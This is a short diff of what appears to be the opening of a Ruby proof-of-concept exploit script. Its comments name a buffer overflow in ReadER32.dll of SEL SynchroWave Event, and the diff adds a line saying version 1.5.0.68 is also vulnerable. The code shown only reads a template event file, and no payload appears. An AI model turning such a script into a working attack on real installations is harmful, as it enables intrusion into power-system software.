@@ -1,6 +1,7 @@
 #!/usr/bin/env ruby
 # SEL SynchroWave Event (1.4.1.6) contains a
 # buffer overflow in ReadER32.dll (1.8.4.0). 
+# update... SynchroWave Event (1.5.0.68) is also vulnerable!
 
 fd = File.open("template.eve", "rb" )
 new_eve = fd.read(fd.stat.size)
